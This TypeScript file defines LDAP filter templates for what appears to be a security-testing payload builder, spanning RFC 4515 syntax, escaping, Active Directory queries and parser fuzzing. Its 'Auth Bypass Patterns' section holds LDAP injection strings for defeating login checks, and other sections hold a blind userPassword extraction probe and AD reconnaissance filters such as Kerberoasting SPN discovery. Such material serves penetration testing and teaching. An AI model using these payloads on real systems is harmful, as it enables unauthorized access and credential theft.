import { TemplateCategory } from '../../types/template';

export const ldapFuzzCategory: TemplateCategory = {
  id: 'ldap-fuzz',
  label: 'LDAP / Fuzz',
  description: 'RFC 4515 LDAP search filters, authentication bypass patterns, Active Directory dialects, and parser fuzzing probes',
  iconName: 'Search',
  subcategories: [
    // ========================================================================
    // 1. RFC 4515 CORE SEARCH FILTERS
    // ========================================================================
    {
      id: 'rfc4515-filters',
      label: 'RFC 4515 Filters',
      description: 'Standard RFC 4515 LDAP filter structures, comparison operators, and boolean combinations',
      templates: [
        {
          id: 'ldap-equality',
          name: 'Equality Match Filter',
          description: 'Standard equality filter matching an exact attribute value',
          content: '({attribute}={value})',
          parameters: [
            { id: 'attribute', label: 'Attribute Name', defaultValue: 'uid', inputType: 'text' },
            { id: 'value', label: 'Attribute Value', defaultValue: 'admin', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-wildcard-prefix',
          name: 'Prefix Substring Match',
          description: 'Matches attributes starting with a specific prefix',
          content: '({attribute}={prefix}*)',
          parameters: [
            { id: 'attribute', label: 'Attribute Name', defaultValue: 'cn', inputType: 'text' },
            { id: 'prefix', label: 'Prefix String', defaultValue: 'adm', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-wildcard-suffix',
          name: 'Suffix Substring Match',
          description: 'Matches attributes ending with a specific suffix',
          content: '({attribute}=*{suffix})',
          parameters: [
            { id: 'attribute', label: 'Attribute Name', defaultValue: 'mail', inputType: 'text' },
            { id: 'suffix', label: 'Suffix String', defaultValue: '@corp.local', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-wildcard-any',
          name: 'Contains / Substring Match',
          description: 'Matches attributes containing a specific substring anywhere in the value',
          content: '({attribute}=*{keyword}*)',
          parameters: [
            { id: 'attribute', label: 'Attribute Name', defaultValue: 'description', inputType: 'text' },
            { id: 'keyword', label: 'Keyword', defaultValue: 'finance', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-presence',
          name: 'Presence Check Filter',
          description: 'Matches any directory entry where the specified attribute is defined',
          content: '({attribute}=*)',
          parameters: [
            { id: 'attribute', label: 'Attribute Name', defaultValue: 'telephoneNumber', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-greater-equal',
          name: 'Greater or Equal Filter',
          description: 'Matches numeric or ordering attributes greater than or equal to a minimum value',
          content: '({attribute}>={min_value})',
          parameters: [
            { id: 'attribute', label: 'Attribute Name', defaultValue: 'uidNumber', inputType: 'text' },
            { id: 'min_value', label: 'Minimum Value', defaultValue: '1000', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-less-equal',
          name: 'Less or Equal Filter',
          description: 'Matches numeric or ordering attributes less than or equal to a maximum value',
          content: '({attribute}<={max_value})',
          parameters: [
            { id: 'attribute', label: 'Attribute Name', defaultValue: 'uidNumber', inputType: 'text' },
            { id: 'max_value', label: 'Maximum Value', defaultValue: '5000', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-approximate',
          name: 'Approximate (~=) Match',
          description: 'Performs phonetic or soundex similarity matching supported by directory schemas',
          content: '({attribute}~={value})',
          parameters: [
            { id: 'attribute', label: 'Attribute Name', defaultValue: 'sn', inputType: 'text' },
            { id: 'value', label: 'Phonetic Value', defaultValue: 'Smith', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-not-negation',
          name: 'Negation (NOT) Filter',
          description: 'Inverts the condition, returning entries where the specified assertion is false',
          content: '(!({attribute}={value}))',
          parameters: [
            { id: 'attribute', label: 'Attribute Name', defaultValue: 'accountStatus', inputType: 'text' },
            { id: 'value', label: 'Value to Exclude', defaultValue: 'disabled', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-compound-and',
          name: 'Compound AND (&) Filter',
          description: 'Combines multiple criteria where all enclosed filters must evaluate to true',
          content: '(&({attr1}={val1})({attr2}={val2}))',
          parameters: [
            { id: 'attr1', label: 'Attribute 1', defaultValue: 'objectClass', inputType: 'text' },
            { id: 'val1', label: 'Value 1', defaultValue: 'person', inputType: 'text' },
            { id: 'attr2', label: 'Attribute 2', defaultValue: 'department', inputType: 'text' },
            { id: 'val2', label: 'Value 2', defaultValue: 'Security', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-compound-or',
          name: 'Compound OR (|) Filter',
          description: 'Combines multiple criteria where at least one enclosed filter must evaluate to true',
          content: '(|({attr1}={val1})({attr2}={val2}))',
          parameters: [
            { id: 'attr1', label: 'Attribute 1', defaultValue: 'title', inputType: 'text' },
            { id: 'val1', label: 'Value 1', defaultValue: 'Manager', inputType: 'text' },
            { id: 'attr2', label: 'Attribute 2', defaultValue: 'title', inputType: 'text' },
            { id: 'val2', label: 'Value 2', defaultValue: 'Director', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-nested-and-or',
          name: 'Nested AND / OR Filter',
          description: 'Demonstrates hierarchical nesting of logical AND and OR operators',
          content: '(&({attr1}={val1})(|({attr2}={val2})({attr3}={val3})))',
          parameters: [
            { id: 'attr1', label: 'Base Filter Attribute', defaultValue: 'objectClass', inputType: 'text' },
            { id: 'val1', label: 'Base Filter Value', defaultValue: 'user', inputType: 'text' },
            { id: 'attr2', label: 'OR Branch 1 Attribute', defaultValue: 'role', inputType: 'text' },
            { id: 'val2', label: 'OR Branch 1 Value', defaultValue: 'Auditor', inputType: 'text' },
            { id: 'attr3', label: 'OR Branch 2 Attribute', defaultValue: 'role', inputType: 'text' },
            { id: 'val3', label: 'OR Branch 2 Value', defaultValue: 'Engineer', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 2. AUTHENTICATION BYPASS LOGIC PATTERNS
    // ========================================================================
    {
      id: 'auth-bypass',
      label: 'Auth Bypass Patterns',
      description: 'Educational filter manipulation patterns demonstrating boolean logic bypasses in unsanitized login inputs',
      templates: [
        {
          id: 'ldap-bypass-wildcard-star',
          name: 'Universal Wildcard (*)',
          description: 'Supplies a single wildcard token to match any valid account identifier',
          content: '*'
        },
        {
          id: 'ldap-bypass-or-always-true',
          name: 'Always-True OR Bypass Pattern',
          description: 'Injects an OR condition that short-circuits the password check by matching any object attribute',
          content: 'admin*)(|(mail=*',
          parameters: [
            { id: 'dummy_param', label: 'Target Account', defaultValue: 'admin', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-bypass-paren-inversion',
          name: 'Parentheses Inversion Pattern',
          description: 'Closes the current search clause and injects a secondary always-true condition',
          content: '*)(uid=*))(|(uid=*'
        },
        {
          id: 'ldap-bypass-null-terminate',
          name: 'Null-Byte Filter Termination',
          description: 'Terminates the C-style string query before the password clause is parsed by backend libraries',
          content: 'admin)(|(password=*)\x00'
        },
        {
          id: 'ldap-bypass-ampersand-nullify',
          name: 'Ampersand Nullifier Pattern',
          description: 'Appends a dangling AND operator structure to neutralize trailing password conditions',
          content: 'admin)(|(&'
        },
        {
          id: 'ldap-bypass-not-guest',
          name: 'Negation Exclusion Bypass',
          description: 'Matches all entries by asserting that the user identifier is not an excluded low-privilege account',
          content: '!(uid=guest))'
        },
        {
          id: 'ldap-bypass-attribute-wildcard',
          name: 'Arbitrary Attribute Wildcard',
          description: 'Injects an arbitrary attribute presence check to force the filter expression to evaluate to true',
          content: 'admin)(|({attribute}=*)',
          parameters: [
            { id: 'attribute', label: 'Presence Attribute', defaultValue: 'description', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-bypass-magic-or',
          name: 'Tautology OR Match',
          description: 'Appends a tautological condition designed to satisfy boolean directory searches',
          content: '*)|(1=1'
        }
      ]
    },

    // ========================================================================
    // 3. BLIND & ATTRIBUTE DISCOVERY PATTERNS
    // ========================================================================
    {
      id: 'blind-enumeration',
      label: 'Attribute Discovery',
      description: 'Filter templates for educational character-by-character blind inference and directory schema probing',
      templates: [
        {
          id: 'ldap-blind-char-search',
          name: 'Character Prefix Blind Probe',
          description: 'Iterative filter pattern for testing character-by-character value extraction via boolean response',
          content: '({attribute}={known_prefix}{test_char}*)',
          parameters: [
            { id: 'attribute', label: 'Target Attribute', defaultValue: 'userPassword', inputType: 'text' },
            { id: 'known_prefix', label: 'Known Prefix', defaultValue: 'a', inputType: 'text' },
            { id: 'test_char', label: 'Probed Character', defaultValue: 'b', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-enum-objectclass',
          name: 'ObjectClass Identification',
          description: 'Verifies the presence of standard directory structural object classes',
          content: '(objectClass={class_name})',
          parameters: [
            { id: 'class_name', label: 'Object Class Name', defaultValue: 'person', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-enum-samaccountname',
          name: 'sAMAccountName Probe',
          description: 'Discovers Active Directory logon account names matching a prefix pattern',
          content: '(sAMAccountName={username}*)',
          parameters: [
            { id: 'username', label: 'Username Prefix', defaultValue: 'adm', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-enum-userprincipal',
          name: 'UserPrincipalName (UPN) Probe',
          description: 'Enumerates Kerberos / Active Directory enterprise UPN identifiers',
          content: '(userPrincipalName={upn_prefix}*)',
          parameters: [
            { id: 'upn_prefix', label: 'UPN Prefix', defaultValue: 'admin@', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-enum-mail',
          name: 'Mail Address Probe',
          description: 'Enumerates email address attributes across organizational directory trees',
          content: '(mail=*{domain_suffix})',
          parameters: [
            { id: 'domain_suffix', label: 'Domain Suffix', defaultValue: '@corp.internal', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-enum-description',
          name: 'Description & Notes Probe',
          description: 'Searches user or machine description attributes for sensitive configuration notes',
          content: '(description=*{keyword}*)',
          parameters: [
            { id: 'keyword', label: 'Search Keyword', defaultValue: 'pass', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-enum-memberof',
          name: 'Group Membership (memberOf) Probe',
          description: 'Filters user accounts that belong to a specific administrative or privileged group DN',
          content: '(memberOf=cn={group_name},ou={ou_name},dc={domain_dc})',
          parameters: [
            { id: 'group_name', label: 'Group CN', defaultValue: 'Domain Admins', inputType: 'text' },
            { id: 'ou_name', label: 'OU Name', defaultValue: 'Groups', inputType: 'text' },
            { id: 'domain_dc', label: 'Domain DC', defaultValue: 'corp,dc=local', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-enum-posix-uid',
          name: 'POSIX Account UID Probe',
          description: 'Searches Linux/Unix OpenLDAP directories for specific numeric POSIX user identifiers',
          content: '(&(objectClass=posixAccount)(uidNumber={uid}))',
          parameters: [
            { id: 'uid', label: 'POSIX UID Number', defaultValue: '0', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 4. RFC 4515 ESCAPING & ENCODING
    // ========================================================================
    {
      id: 'encoding-rfc4515',
      label: 'RFC 4515 Escaping',
      description: 'Standard 2-digit hexadecimal escape representations for LDAP filter control characters (RFC 4515 Section 3)',
      templates: [
        {
          id: 'ldap-esc-asterisk',
          name: 'Escaped Asterisk (\\2a)',
          description: 'Escaped representation of literal asterisk (*) to prevent wildcard expansion',
          content: '({attribute}={prefix}\\2a)',
          parameters: [
            { id: 'attribute', label: 'Attribute', defaultValue: 'cn', inputType: 'text' },
            { id: 'prefix', label: 'Literal Value', defaultValue: 'test', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-esc-open-paren',
          name: 'Escaped Open Parenthesis (\\28)',
          description: 'Escaped representation of literal left parenthesis (() to prevent clause boundary breakage',
          content: '({attribute}=\\28{value})',
          parameters: [
            { id: 'attribute', label: 'Attribute', defaultValue: 'cn', inputType: 'text' },
            { id: 'value', label: 'Inner Value', defaultValue: 'test', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-esc-close-paren',
          name: 'Escaped Close Parenthesis (\\29)',
          description: 'Escaped representation of literal right parenthesis ()) to prevent early filter termination',
          content: '({attribute}={value}\\29)',
          parameters: [
            { id: 'attribute', label: 'Attribute', defaultValue: 'cn', inputType: 'text' },
            { id: 'value', label: 'Inner Value', defaultValue: 'test', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-esc-backslash',
          name: 'Escaped Backslash (\\5c)',
          description: 'Escaped representation of literal backslash (\\) used in domain qualified names',
          content: '({attribute}={domain}\\5c{user})',
          parameters: [
            { id: 'attribute', label: 'Attribute', defaultValue: 'sAMAccountName', inputType: 'text' },
            { id: 'domain', label: 'Domain', defaultValue: 'CORP', inputType: 'text' },
            { id: 'user', label: 'User', defaultValue: 'admin', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-esc-null-byte',
          name: 'Escaped Null Byte (\\00)',
          description: 'RFC 4515 compliant 2-digit hex encoding for the null termination byte (ASCII 0)',
          content: '({attribute}={user}\\00)',
          parameters: [
            { id: 'attribute', label: 'Attribute', defaultValue: 'uid', inputType: 'text' },
            { id: 'user', label: 'Username', defaultValue: 'admin', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-url-rfc4515-all',
          name: 'URL-Encoded RFC 4515 Bypass',
          description: 'Demonstration of fully URL-encoded filter expression for HTTP GET/POST parameter testing',
          content: '%28%26%28uid%3Dadmin%29%28%7C%28mail%3D%2A%29%29%29'
        },
        {
          id: 'ldap-double-hex-escape',
          name: 'Double-Escaped Sequence (\\\\2a)',
          description: 'Double-escaped backslash representation for testing double-decode parsing behavior',
          content: '({attribute}={prefix}\\\\2a)',
          parameters: [
            { id: 'attribute', label: 'Attribute', defaultValue: 'cn', inputType: 'text' },
            { id: 'prefix', label: 'Value', defaultValue: 'test', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 5. ACTIVE DIRECTORY & ENTERPRISE DIALECTS
    // ========================================================================
    {
      id: 'active-directory',
      label: 'Active Directory Dialects',
      description: 'Specialized search syntax for Microsoft Active Directory, bitmask filters, and LDAP matching rules',
      templates: [
        {
          id: 'ldap-ad-uac-disabled',
          name: 'UAC Disabled Accounts (Bitmask 2)',
          description: 'Active Directory bitwise rule 1.2.840.113556.1.4.803 matching disabled user accounts',
          content: '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))'
        },
        {
          id: 'ldap-ad-uac-pwd-not-req',
          name: 'UAC Password Not Required (Bitmask 32)',
          description: 'Matches user accounts where the password requirement is explicitly bypassed (PASSWD_NOTREQD)',
          content: '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))'
        },
        {
          id: 'ldap-ad-uac-pwd-dont-expire',
          name: 'UAC Password Never Expires (Bitmask 65536)',
          description: 'Identifies accounts configured with non-expiring passwords (DONT_EXPIRE_PASSWORD)',
          content: '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))'
        },
        {
          id: 'ldap-ad-admincount',
          name: 'AdminCount Protected Accounts',
          description: 'Discovers accounts protected by AdminSDHolder representing high-privilege directory groups',
          content: '(&(objectCategory=person)(objectClass=user)(adminCount=1))'
        },
        {
          id: 'ldap-ad-spn-discovery',
          name: 'Service Principal Names (SPN) Discovery',
          description: 'Finds user accounts that possess registered Service Principal Names (Kerberoasting targets)',
          content: '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))'
        },
        {
          id: 'ldap-ad-recursive-member',
          name: 'Recursive Group Membership (In-Chain)',
          description: 'Active Directory LDAP_MATCHING_RULE_IN_CHAIN rule (1.2.840.113556.1.4.1941) searching nested groups recursively',
          content: '(member:1.2.840.113556.1.4.1941:={group_dn})',
          parameters: [
            { id: 'group_dn', label: 'Group DN', defaultValue: 'CN=Domain Admins,CN=Users,DC=corp,DC=local', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-ad-trust-objects',
          name: 'Active Directory Trust Objects',
          description: 'Enumerates inter-forest and external domain trust relationship objects',
          content: '(objectClass=trustedDomain)'
        }
      ]
    },

    // ========================================================================
    // 6. BOUNDARY DELIMITERS & PARSER FUZZING
    // ========================================================================
    {
      id: 'fuzzing-delimiters',
      label: 'Delimiters & Fuzzing',
      description: 'Control character sequences, boundary payloads, and nesting anomalies for testing LDAP parser robustness',
      templates: [
        {
          id: 'ldap-fuzz-core-delimiters',
          name: 'Core Control Delimiters',
          description: 'Concatenated core control characters used for quick input boundary fuzzing',
          content: ')(*|&!'
        },
        {
          id: 'ldap-fuzz-reserved-chars',
          name: 'RFC 4515 Control Permutation',
          description: 'Comprehensive sequence of reserved hex escapes and special boundary characters',
          content: '\\00\\2a\\28\\29\\5c/~#$^%'
        },
        {
          id: 'ldap-fuzz-nested-parens',
          name: 'Deep Parentheses Nesting Probe',
          description: 'Tests parser stack limits and recursive expression handling with deeply nested parentheses',
          content: '(((((((((cn={value})))))))))',
          parameters: [
            { id: 'value', label: 'Probe Value', defaultValue: 'admin', inputType: 'text' }
          ]
        },
        {
          id: 'ldap-fuzz-empty-clauses',
          name: 'Empty Compound Logic Probe',
          description: 'Tests server handling of degenerate empty compound operator structures',
          content: '(&()(|()(!())))'
        },
        {
          id: 'ldap-fuzz-null-and-high-byte',
          name: 'Null & High-Byte Boundary Probe',
          description: 'Combines null byte and high-order ASCII characters to test encoding sanitization',
          content: '%00%ff%fe%00\\x00\\xff'
        },
        {
          id: 'ldap-fuzz-whitespace-spacers',
          name: 'Non-Standard Whitespace Spacers',
          description: 'Tests parser tolerance against tabs, newlines, vertical tabs, and form feeds',
          content: ' \t\r\n\v\f'
        },
        {
          id: 'ldap-fuzz-special-wildcards',
          name: 'Malformed Wildcard Permutation',
          description: 'Tests filter optimization handling of repeated and misplaced asterisk wildcards',
          content: '***)(cn=***)(|(*=*))'
        }
      ]
    }
  ]
};
